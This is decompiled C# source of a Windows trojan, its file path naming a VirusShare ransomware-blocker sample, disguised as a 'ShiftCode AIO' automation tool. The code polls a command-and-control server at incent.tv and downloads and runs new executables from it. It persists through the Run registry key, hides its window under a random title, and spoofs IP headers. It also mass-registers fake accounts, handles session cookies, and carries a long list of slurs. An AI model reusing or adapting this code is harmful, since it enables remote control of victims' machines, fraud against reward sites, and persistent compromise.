// Decompiled with JetBrains decompiler
// Type: SC_aio.aio
// Assembly: SCaio, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4039BEB0-723F-44D4-B6A2-6115173D2A3D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00050-msil\Trojan-Ransom.Win32.Blocker.asho-8d599606a9e08d397b994f3c1f6ab611585cb198.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using SC_aio.My;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

namespace SC_aio
{
  [DesignerGenerated]
  public class aio : Form
  {
    private IContainer components;
    [AccessedThroughProperty("scmembert")]
    private TextBox _scmembert;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("mtaf")]
    private Button _mtaf;
    [AccessedThroughProperty("Label2")]
    private Label _Label2;
    [AccessedThroughProperty("domaint")]
    private TextBox _domaint;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("sbb")]
    private Button _sbb;
    [AccessedThroughProperty("regb")]
    private Button _regb;
    [AccessedThroughProperty("offb")]
    private Button _offb;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("wdb")]
    private Button _wdb;
    [AccessedThroughProperty("ctb")]
    private Button _ctb;
    public bool autocontrolled;
    public double version;
    public Random rand;
    public CookieContainer logincookie;
    public string domain;
    public string scmember;
    public int threads;
    public int pass;
    public string[] firstnames;
    public string[] lastnames;
    public string[] addresses;
    public string[] roads;
    public string[] cities;
    public string[] words;
    public string[] profanity;
    public string[] profanity2;
    public string[] emaildomains;
    public string[] useragents;
    public string sip;
    public int taskid;
    private string taskuser;

    public aio()
    {
      this.GotFocus += new EventHandler(this.aio_GotFocus);
      this.Load += new EventHandler(this.aio_Load);
      this.autocontrolled = true;
      this.version = 0.01;
      this.rand = new Random();
      this.firstnames = new string[45]
      {
        "John",
        "Sam",
        "Jack",
        "Jamie",
        "James",
        "Simon",
        "Susan",
        "Paul",
        "Phillip",
        "Tracy",
        "Bill",
        "Jordan",
        "Tom",
        "Andrew",
        "Jill",
        "Maggie",
        "Denise",
        "Michael",
        "Eric",
        "Mike",
        "Andy",
        "Matthew",
        "Shawn",
        "Ronald",
        "Patrick",
        "Cody",
        "Francine",
        "Donald",
        "Daniel",
        "Peter",
        "Joseph",
        "Joe",
        "Martin",
        "Richard",
        "Clive",
        "Tony",
        "Anthony",
        "Brian",
        "William",
        "Charles",
        "Lennie",
        "Lenny",
        "Sara",
        "Sarah",
        "Holly"
      };
      this.lastnames = new string[31]
      {
        "Smith",
        "Jackson",
        "Miller",
        "Trebilcock",
        "Saunders",
        "Miles",
        "Woods",
        "Rogers",
        "Walters",
        "Scott",
        "Price",
        "Johnson",
        "Thomas",
        "Kelly",
        "Swanson",
        "Green",
        "Wright",
        "Rosolino",
        "Day",
        "Doyle",
        "Pappas",
        "Perry",
        "Cooper",
        "Bell",
        "Baker",
        "Wilson",
        "Lance",
        "King",
        "Davis",
        "Ashton",
        "White"
      };
      this.addresses = new string[25]
      {
        "Green",
        "Grove",
        "Trinity",
        "Rover",
        "Crave",
        "Grain",
        "Trinity",
        "Abbey",
        "Oak",
        "Maple",
        "Pine",
        "Hill",
        "Lake",
        "Elm",
        "View",
        "Church",
        "Meadow",
        "Madisonville",
        "North",
        "East",
        "South",
        "West",
        "Direction",
        "River",
        "Pond"
      };
      this.roads = new string[5]
      {
        "Road",
        "Lane",
        "Street",
        "Avenue",
        "Drive"
      };
      this.cities = new string[15]
      {
        "London",
        "New London",
        "Wichita",
        "Manchester",
        "Liverpool",
        "Pittsburgh",
        "Durham",
        "Hialeah",
        "Fremont",
        "Waco",
        "Denton",
        "Rialto",
        "Oakland",
        "Scarland",
        "Jupie"
      };
      this.words = new string[133]
      {
        "money",
        "cash",
        "gpt",
        "guy",
        "coder",
        "zombie",
        "gamer",
        "king",
        "burger",
        "munch",
        "music",
        "sweep",
        "earn",
        "top",
        "sexy",
        "tree",
        "ocean",
        "nature",
        "troll",
        "spain",
        "france",
        "usa",
        "girl",
        "boy",
        "woman",
        "navy",
        "marine",
        "jetski",
        "basketball",
        "football",
        "tennis",
        "solider",
        "winning",
        "ftw",
        "clean",
        "wild",
        "pwn",
        "man",
        "coltsfan",
        "rpgfan",
        "carson",
        "jimbobby",
        "jump",
        "pistol",
        "rocket",
        "pro",
        "sports",
        "token",
        "pocket",
        "watch",
        "spider",
        "worm",
        "sky",
        "sea",
        "echo",
        "target",
        "arrow",
        "go",
        "fly",
        "plane",
        "space",
        "king",
        "jk",
        "dude",
        "phone",
        "tune",
        "ghost",
        "chill",
        "relax",
        "berry",
        "apple",
        "orange",
        "pear",
        "jacket",
        "flow",
        "rush",
        "smile",
        "dance",
        "free",
        "mister",
        "mr",
        "mrs",
        "dr",
        "co",
        "ceo",
        "lemon",
        "killer",
        "brain",
        "splash",
        "rap",
        "mc",
        "minecraft",
        "mine",
        "craft",
        "chop",
        "clear",
        "runied",
        "blue",
        "red",
        "yellow",
        "orange",
        "green",
        "purple",
        "rope",
        "ramp",
        "rum",
        "bear",
        "pong",
        "ping",
        "pan",
        "trail",
        "tramp",
        "lol",
        "learn",
        "lean",
        "jeans",
        "joke",
        "batman",
        "bat",
        "wings",
        "death",
        "spooky",
        "angel",
        "monster",
        "ant",
        "step",
        "soft",
        "hard",
        "bounce",
        "spike",
        "lag",
        "lang",
        "language"
      };
      this.profanity = new string[312]
      {
        "ass",
        "asses",
        "asshopper",
        "cock",
        "coon",
        "cracker",
        "cum",
        "dick",
        "heeb",
        "hell",
        "homo",
        "humping",
        "jap",
        "mick",
        "muff",
        "paki",
        "poon",
        "spic",
        "tard",
        "tit",
        "tits",
        "twat",
        "vag",
        "asshat",
        "asspirate",
        "assbag",
        "assbandit",
        "assbanger",
        "assbite",
        "assclown",
        "asscock",
        "asscracker",
        "assface",
        "assfuck",
        "assfucker",
        "assgoblin",
        "asshat",
        "asshead",
        "asshole",
        "assjacker",
        "asslick",
        "asslicker",
        "assmonkey",
        "assmunch",
        "assmuncher",
        "assnigger",
        "asspirate",
        "assshit",
        "assshole",
        "asssucker",
        "asswad",
        "asswipe",
        "bastard",
        "bitch",
        "bitchass",
        "bitches",
        "bitchtits",
        "bitchy",
        "blowjob",
        "blowjob",
        "bollocks",
        "bollox",
        "boner",
        "brotherfucker",
        "bullshit",
        "bumblefuck",
        "buttplug",
        "buttpirate",
        "buttfucka",
        "buttfucker",
        "cameltoe",
        "carpetmuncher",
        "choad",
        "chode",
        "clit",
        "clitface",
        "clitfuck",
        "clusterfuck",
        "cockass",
        "cockbite",
        "cockburger",
        "cockface",
        "cockfucker",
        "cockhead",
        "cockjockey",
        "cockknoker",
        "cockmaster",
        "cockmongler",
        "cockmongruel",
        "cockmonkey",
        "cockmuncher",
        "cocknose",
        "cocknugget",
        "cockshit",
        "cocksmith",
        "cocksmoker",
        "cocksucker",
        "coochie",
        "coochy",
        "cooter",
        "cumbubble",
        "cumdumpster",
        "cumguzzler",
        "cumjockey",
        "cumslut",
        "cumtart",
        "cunnie",
        "cunnilingus",
        "cunt",
        "cuntface",
        "cunthole",
        "cuntlicker",
        "cuntrag",
        "cuntslut",
        "damn",
        "deggo",
        "dickbag",
        "dickbeaters",
        "dickface",
        "dickfuck",
        "dickfucker",
        "dickhead",
        "dickhole",
        "dickjuice",
        "dickmilk",
        "dickmonger",
        "dicks",
        "dickslap",
        "dicksucker",
        "dickwad",
        "dickweasel",
        "dickweed",
        "dickwod",
        "dike",
        "dildo",
        "dipshit",
        "doochbag",
        "dookie",
        "douche",
        "douchefag",
        "douchebag",
        "douchewaffle",
        "dumass",
        "dumbass",
        "dumbass",
        "dumbfuck",
        "dumbshit",
        "dumshit",
        "dyke",
        "fag",
        "fagbag",
        "fagfucker",
        "faggit",
        "faggot",
        "faggotcock",
        "fagtard",
        "fatass",
        "fellatio",
        "feltch",
        "flamer",
        "fuck",
        "fuckass",
        "fuckbag",
        "fuckboy",
        "fuckbrain",
        "fuckbutt",
        "fucked",
        "fucker",
        "fuckersucker",
        "fuckface",
        "fuckhead",
        "fuckhole",
        "fuckin",
        "fucking",
        "fucknut",
        "fucknutt",
        "fuckoff",
        "fucks",
        "fuckstick",
        "fucktard",
        "fuckup",
        "fuckwad",
        "fuckwit",
        "fuckwitt",
        "fudgepacker",
        "gay",
        "gayass",
        "gaybob",
        "gaydo",
        "gayfuck",
        "gayfuckist",
        "gaylord",
        "gaytard",
        "gaywad",
        "goddamn",
        "goddamnit",
        "gooch",
        "gook",
        "gringo",
        "guido",
        "handjob",
        "hardon",
        "homodumbshit",
        "honkey",
        "jackass",
        "jerkoff",
        "jigaboo",
        "jizz",
        "junglebunny",
        "kike",
        "kooch",
        "kootch",
        "kunt",
        "kyke",
        "lesbian",
        "lesbo",
        "lezzie",
        "mcfagget",
        "minge",
        "mothafucka",
        "motherfucker",
        "motherfucking",
        "muffdiver",
        "munging",
        "negro",
        "nigga",
        "nigger",
        "niggers",
        "niglet",
        "nutsack",
        "nutsack",
        "panooch",
        "pecker",
        "peckerhead",
        "penis",
        "penisfucker",
        "penispuffer",
        "piss",
        "pissed",
        "pissedoff",
        "pissflaps",
        "polesmoker",
        "pollock",
        "poonani",
        "poonany",
        "poontang",
        "porchmonkey",
        "porchmonkey",
        "prick",
        "punanny",
        "punta",
        "pussies",
        "pussy",
        "pussylicking",
        "puto",
        "queef",
        "queer",
        "queerbait",
        "queerhole",
        "renob",
        "rimjob",
        "ruski",
        "sandnigger",
        "sandnigger",
        "schlong",
        "scrote",
        "shit",
        "shitass",
        "shitbag",
        "shitbagger",
        "shitbrains",
        "shitbreath",
        "shitcunt",
        "shitdick",
        "shitface",
        "shitfaced",
        "shithead",
        "shithole",
        "shithouse",
        "shitspitter",
        "shitstain",
        "shitter",
        "shittiest",
        "shitting",
        "shitty",
        "shiz",
        "shiznit",
        "skank",
        "skeet",
        "skullfuck",
        "slut",
        "slutbag",
        "smeg",
        "snatch",
        "spick",
        "splooge",
        "testicle",
        "thundercunt",
        "titfuck",
        "tittyfuck",
        "twatlips",
        "twats",
        "twatwaffle",
        "unclefucker",
        "vajj",
        "vagina",
        "vjayjay",
        "wank",
        "wetback",
        "whore",
        "whorebag",
        "whoreface"
      };
      this.profanity2 = new string[5]
      {
        "BlTCH",
        "SHlT",
        "C0CK",
        "DlCK",
        "rainbow kiss"
      };
      this.emaildomains = new string[8]
      {
        "yahoo.com",
        "hotmail.com",
        "gmail.com",
        "googlemail.com",
        "mail.com",
        "gmx.com",
        "easy.com",
        "hustmail.com"
      };
      this.useragents = new string[13]
      {
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1309.0 Safari/537.17",
        "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/24.0.1295.0 Safari/537.15",
        "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.13 (KHTML, like Gecko) Chrome/24.0.1290.1 Safari/537.13",
        "Mozilla/6.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
        "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
        "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1",
        "Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10",
        "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
        "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
        "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
        "Mozilla/5.0 (Windows NT 5.1) Gecko/20100101 Firefox/14.0 Opera/12.0"
      };
      this.sip = "";
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.scmembert = new TextBox();
      this.Label1 = new Label();
      this.mtaf = new Button();
      this.Label2 = new Label();
      this.domaint = new TextBox();
      this.Button1 = new Button();
      this.sbb = new Button();
      this.regb = new Button();
      this.offb = new Button();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.wdb = new Button();
      this.ctb = new Button();
      this.SuspendLayout();
      TextBox scmembert1 = this.scmembert;
      Point point1 = new Point(78, 29);
      Point point2 = point1;
      scmembert1.Location = point2;
      this.scmembert.Name = "scmembert";
      TextBox scmembert2 = this.scmembert;
      Size size1 = new Size(189, 20);
      Size size2 = size1;
      scmembert2.Size = size2;
      this.scmembert.TabIndex = 2;
      this.Label1.AutoSize = true;
      Label label1_1 = this.Label1;
      point1 = new Point(7, 32);
      Point point3 = point1;
      label1_1.Location = point3;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      size1 = new Size(65, 13);
      Size size3 = size1;
      label1_2.Size = size3;
      this.Label1.TabIndex = 0;
      this.Label1.Text = "SC_Member";
      this.mtaf.Enabled = false;
      Button mtaf1 = this.mtaf;
      point1 = new Point(10, 84);
      Point point4 = point1;
      mtaf1.Location = point4;
      this.mtaf.Name = "mtaf";
      Button mtaf2 = this.mtaf;
      size1 = new Size(257, 23);
      Size size4 = size1;
      mtaf2.Size = size4;
      this.mtaf.TabIndex = 4;
      this.mtaf.Text = "Mass Tell a Friend (Mass Emailer)";
      this.mtaf.UseVisualStyleBackColor = true;
      this.Label2.AutoSize = true;
      Label label2_1 = this.Label2;
      point1 = new Point(29, 9);
      Point point5 = point1;
      label2_1.Location = point5;
      this.Label2.Name = "Label2";
      Label label2_2 = this.Label2;
      size1 = new Size(43, 13);
      Size size5 = size1;
      label2_2.Size = size5;
      this.Label2.TabIndex = 0;
      this.Label2.Text = "Domain";
      TextBox domaint1 = this.domaint;
      point1 = new Point(78, 6);
      Point point6 = point1;
      domaint1.Location = point6;
      this.domaint.Name = "domaint";
      TextBox domaint2 = this.domaint;
      size1 = new Size(189, 20);
      Size size6 = size1;
      domaint2.Size = size6;
      this.domaint.TabIndex = 1;
      Button button1_1 = this.Button1;
      point1 = new Point(10, 55);
      Point point7 = point1;
      button1_1.Location = point7;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      size1 = new Size(257, 23);
      Size size7 = size1;
      button1_2.Size = size7;
      this.Button1.TabIndex = 3;
      this.Button1.Text = "Authenticate";
      this.Button1.UseVisualStyleBackColor = true;
      this.sbb.Enabled = false;
      Button sbb1 = this.sbb;
      point1 = new Point(10, 113);
      Point point8 = point1;
      sbb1.Location = point8;
      this.sbb.Name = "sbb";
      Button sbb2 = this.sbb;
      size1 = new Size(257, 23);
      Size size8 = size1;
      sbb2.Size = size8;
      this.sbb.TabIndex = 5;
      this.sbb.Text = "Shoutbox";
      this.sbb.UseVisualStyleBackColor = true;
      this.regb.Enabled = false;
      Button regb1 = this.regb;
      point1 = new Point(10, 142);
      Point point9 = point1;
      regb1.Location = point9;
      this.regb.Name = "regb";
      Button regb2 = this.regb;
      size1 = new Size(257, 23);
      Size size9 = size1;
      regb2.Size = size9;
      this.regb.TabIndex = 6;
      this.regb.Text = "Registration";
      this.regb.UseVisualStyleBackColor = true;
      this.offb.Enabled = false;
      Button offb1 = this.offb;
      point1 = new Point(10, 171);
      Point point10 = point1;
      offb1.Location = point10;
      this.offb.Name = "offb";
      Button offb2 = this.offb;
      size1 = new Size(257, 23);
      Size size10 = size1;
      offb2.Size = size10;
      this.offb.TabIndex = 7;
      this.offb.Text = "Complete Offers";
      this.offb.UseVisualStyleBackColor = true;
      this.Timer1.Interval = 1;
      this.wdb.Enabled = false;
      Button wdb1 = this.wdb;
      point1 = new Point(10, 200);
      Point point11 = point1;
      wdb1.Location = point11;
      this.wdb.Name = "wdb";
      Button wdb2 = this.wdb;
      size1 = new Size(257, 23);
      Size size11 = size1;
      wdb2.Size = size11;
      this.wdb.TabIndex = 7;
      this.wdb.Text = "Withdraw";
      this.wdb.UseVisualStyleBackColor = true;
      this.ctb.Enabled = false;
      Button ctb1 = this.ctb;
      point1 = new Point(10, 229);
      Point point12 = point1;
      ctb1.Location = point12;
      this.ctb.Name = "ctb";
      Button ctb2 = this.ctb;
      size1 = new Size(257, 23);
      Size size12 = size1;
      ctb2.Size = size12;
      this.ctb.TabIndex = 7;
      this.ctb.Text = "Contests";
      this.ctb.UseVisualStyleBackColor = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(279, 258);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.ctb);
      this.Controls.Add((Control) this.wdb);
      this.Controls.Add((Control) this.offb);
      this.Controls.Add((Control) this.regb);
      this.Controls.Add((Control) this.sbb);
      this.Controls.Add((Control) this.Button1);
      this.Controls.Add((Control) this.domaint);
      this.Controls.Add((Control) this.Label2);
      this.Controls.Add((Control) this.mtaf);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.scmembert);
      this.MaximizeBox = false;
      this.Name = nameof (aio);
      this.Text = "ShiftCode AIO";
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox scmembert
    {
      get => this._scmembert;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._scmembert = value;
    }

    internal virtual Label Label1
    {
      get => this._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual Button mtaf
    {
      get => this._mtaf;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.mtaf_Click);
        if (this._mtaf != null)
          this._mtaf.Click -= eventHandler;
        this._mtaf = value;
        if (this._mtaf == null)
          return;
        this._mtaf.Click += eventHandler;
      }
    }

    internal virtual Label Label2
    {
      get => this._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label2 = value;
    }

    internal virtual TextBox domaint
    {
      get => this._domaint;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._domaint = value;
    }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        if (this._Button1 != null)
          this._Button1.Click -= eventHandler;
        this._Button1 = value;
        if (this._Button1 == null)
          return;
        this._Button1.Click += eventHandler;
      }
    }

    internal virtual Button sbb
    {
      get => this._sbb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.sbb_Click);
        if (this._sbb != null)
          this._sbb.Click -= eventHandler;
        this._sbb = value;
        if (this._sbb == null)
          return;
        this._sbb.Click += eventHandler;
      }
    }

    internal virtual Button regb
    {
      get => this._regb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click);
        if (this._regb != null)
          this._regb.Click -= eventHandler;
        this._regb = value;
        if (this._regb == null)
          return;
        this._regb.Click += eventHandler;
      }
    }

    internal virtual Button offb
    {
      get => this._offb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.offb_Click);
        if (this._offb != null)
          this._offb.Click -= eventHandler;
        this._offb = value;
        if (this._offb == null)
          return;
        this._offb.Click += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      get => this._Timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual Button wdb
    {
      get => this._wdb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.wd_Click);
        if (this._wdb != null)
          this._wdb.Click -= eventHandler;
        this._wdb = value;
        if (this._wdb == null)
          return;
        this._wdb.Click += eventHandler;
      }
    }

    internal virtual Button ctb
    {
      get => this._ctb;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ctb_Click);
        if (this._ctb != null)
          this._ctb.Click -= eventHandler;
        this._ctb = value;
        if (this._ctb == null)
          return;
        this._ctb.Click += eventHandler;
      }
    }

    public string randSelect(string[] list) => list[this.rand.Next(0, list.Length)];

    public static void AddStartup(string Name, string Path)
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(Name, (object) Path, RegistryValueKind.String);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public object ReadKey(string Name)
    {
      object obj;
      try
      {
        obj = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Name);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        obj = (object) "";
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static void RemoveKey(string Name)
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue(Name);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public object randLetters(object min, object max)
    {
      string str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
      StringBuilder stringBuilder = new StringBuilder();
      int num1 = this.rand.Next(Conversions.ToInteger(min), Conversions.ToInteger(max));
      int num2 = 1;
      while (num2 <= num1)
      {
        int startIndex = this.rand.Next(0, 25);
        if (this.rand.Next(0, 2) == 1)
          stringBuilder.Append(str.Substring(startIndex, 1).ToLower());
        else
          stringBuilder.Append(str.Substring(startIndex, 1));
        checked { ++num2; }
      }
      return (object) stringBuilder.ToString();
    }

    public void spoofip() => this.sip = this.rand.Next(1, (int) byte.MaxValue).ToString() + "." + this.rand.Next(1, (int) byte.MaxValue).ToString() + "." + this.rand.Next(1, (int) byte.MaxValue).ToString() + "." + this.rand.Next(1, (int) byte.MaxValue).ToString();

    public void stealth()
    {
      this.Hide();
      this.Opacity = 0.0;
      this.ShowInTaskbar = false;
      this.ShowIcon = false;
      this.Text = Conversions.ToString(this.randLetters((object) 1, (object) 15));
    }

    public bool signuptosite(string username) => Operators.CompareString(Conversions.ToString(this.sendPost("http://incent.tv/signup.php", "s=" + this.taskid.ToString() + "&u=" + username)), "success", false) == 0;

    public bool reporterror(string errormsg) => Operators.CompareString(Conversions.ToString(this.sendPost("http://incent.tv/error.php", "s=" + this.taskid.ToString() + "&e=" + errormsg)), "success", false) == 0;

    public bool updatesite(
      string withdraw,
      string offercontest,
      string referralcontest,
      string clickcontest,
      string jackpot)
    {
      return Operators.CompareString(Conversions.ToString(this.sendPost("http://incent.tv/do.php", "s=" + this.taskid.ToString() + "&w=" + withdraw + "&o=" + offercontest + "&r=" + referralcontest + "&p=" + clickcontest + "&j=" + jackpot)), "success", false) == 0;
    }

    private bool docommand()
    {
      try
      {
        string[] strArray = this.getcommands().Split('|');
        if (Operators.CompareString(strArray[0], "signup", false) == 0)
        {
          this.taskid = Conversions.ToInteger(strArray[1]);
          this.domaint.Text = strArray[2];
          this.Button1.PerformClick();
          string errormsg = MyProject.Forms.reg.register(strArray[2], strArray[3]);
          if (errormsg.Contains("Success"))
          {
            this.taskid = 0;
            return true;
          }
          this.reporterror(errormsg);
        }
        else if (Operators.CompareString(strArray[0], "updatesite", false) == 0)
        {
          this.taskid = Conversions.ToInteger(strArray[1]);
          this.domaint.Text = strArray[2];
          this.taskuser = strArray[3];
          this.scmembert.Text = this.taskuser + "%3A12f2011d1a78cb2376c55f573362fb2b";
          this.Button1.PerformClick();
          string clickcontest = Conversions.ToString(MyProject.Forms.ct.getContest("click", true));
          string referralcontest = Conversions.ToString(MyProject.Forms.ct.getContest("referral", true));
          string offercontest = Conversions.ToString(MyProject.Forms.ct.getContest("offer", true));
          string jackpot = Conversions.ToString(MyProject.Forms.ct.getJackpot(true));
          string withdraw = Conversions.ToString(MyProject.Forms.wd.getWithdrawOptions(true));
          if (withdraw.Length == 0 & offercontest.Length == 0 & jackpot.Length == 0 & referralcontest.Length == 0 & clickcontest.Length == 0)
            this.reporterror("Unable to update site!");
          if (this.updatesite(withdraw, offercontest, referralcontest, clickcontest, jackpot))
          {
            this.taskid = 0;
            return true;
          }
        }
        else if (Operators.CompareString(strArray[0], "update", false) == 0)
        {
          new WebClient().DownloadFile("http://incent.tv/" + strArray[1], this.Text + ".exe");
          aio.AddStartup("whereitwas", Application.ExecutablePath);
          aio.RemoveKey("win32 service");
          Process.Start(this.Text + ".exe");
          this.Close();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.taskid = 0;
      return false;
    }

    private string getcommands() => Conversions.ToString(this.sendPost("http://incent.tv/get.php", "v=" + this.version.ToString()));

    public object sendPost(string url, string postData)
    {
      try
      {
        CookieContainer cookieContainer = new CookieContainer();
        byte[] bytes = new UTF8Encoding().GetBytes(postData);
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(url);
        httpWebRequest.Method = "POST";
        httpWebRequest.KeepAlive = true;
        httpWebRequest.Timeout = 30000;
        httpWebRequest.CookieContainer = this.logincookie;
        httpWebRequest.ContentType = "application/x-www-form-urlencoded";
        httpWebRequest.Referer = !this.autocontrolled ? "" : "http://www.incent.tv/";
        httpWebRequest.UserAgent = this.randSelect(this.useragents);
        httpWebRequest.ContentLength = (long) bytes.Length;
        httpWebRequest.CookieContainer = this.logincookie;
        if (this.sip.Length > 0)
        {
          httpWebRequest.Headers.Add("IP: " + this.sip);
          httpWebRequest.Headers.Add("NginxIP: " + this.sip);
          httpWebRequest.Headers.Add("HTTP_REMOTE_ADDR: " + this.sip);
          httpWebRequest.Headers.Add("REMOTE_ADDR: " + this.sip);
          httpWebRequest.Headers.Add("X-Real-IP: " + this.sip);
          httpWebRequest.Headers.Add("X-Forwarded-For: " + this.sip);
          httpWebRequest.Headers.Add("X-Varnish: " + this.sip);
          httpWebRequest.Headers.Add("Real-IP: " + this.sip);
          httpWebRequest.Headers.Add("Forwarded-For: " + this.sip);
          httpWebRequest.Headers.Add("Varnish: " + this.sip);
          httpWebRequest.Headers.Add("Real_IP: " + this.sip);
          httpWebRequest.Headers.Add("Forwarded_For: " + this.sip);
          httpWebRequest.Headers.Add("X_Real_IP: " + this.sip);
          httpWebRequest.Headers.Add("X_Forwarded_For: " + this.sip);
          httpWebRequest.Headers.Add("X_Varnish: " + this.sip);
        }
        Stream requestStream = httpWebRequest.GetRequestStream();
        requestStream.Write(bytes, 0, bytes.Length);
        requestStream.Close();
        HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse();
        cookieContainer.Add(response.Cookies);
        if (this.scmembert.Text.Length == 0 | MyProject.Forms.sb.shoutbox.Text.Length == 0)
        {
          try
          {
            foreach (Cookie cookie in response.Cookies)
            {
              if (Operators.CompareString(cookie.Name, "SC_member", false) == 0 & this.scmembert.Text.Length == 0)
              {
                this.scmembert.Text = cookie.Value;
                this.Button1.PerformClick();
              }
              else if (Operators.CompareString(cookie.Name, "shoutbox", false) == 0 & MyProject.Forms.sb.shoutbox.Text.Length == 0)
                MyProject.Forms.sb.shoutbox.Text = cookie.Value;
            }
          }
          finally
          {
            IEnumerator enumerator;
            if (enumerator is IDisposable)
              (enumerator as IDisposable).Dispose();
          }
        }
        if (url.Contains(this.domain))
          this.logincookie.Add(response.Cookies);
        return (object) new StreamReader(response.GetResponseStream()).ReadToEnd();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        if (this.autocontrolled)
          this.reporterror("Unable to reach site, site down or ISP blocked.");
        ProjectData.ClearProjectError();
      }
      return (object) "error";
    }

    private void mtaf_Click(object sender, EventArgs e) => MyProject.Forms.masstell.Show();

    private void Button1_Click(object sender, EventArgs e)
    {
      try
      {
        this.logincookie = new CookieContainer();
        this.logincookie.Add(new Cookie()
        {
          Domain = "." + this.domaint.Text,
          Path = "/",
          Name = "SC_member",
          Value = this.scmembert.Text
        });
        this.domain = this.domaint.Text;
        this.scmember = this.scmembert.Text;
        if (this.scmembert.Text.Length > 0)
        {
          this.mtaf.Enabled = true;
          this.offb.Enabled = true;
          this.wdb.Enabled = true;
          this.ctb.Enabled = true;
        }
        else
        {
          this.mtaf.Enabled = false;
          this.offb.Enabled = false;
          this.wdb.Enabled = false;
          this.ctb.Enabled = false;
        }
        this.sbb.Enabled = true;
        this.regb.Enabled = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) "Error with the domain submitted.");
        ProjectData.ClearProjectError();
      }
    }

    private void sbb_Click(object sender, EventArgs e) => MyProject.Forms.sb.Show();

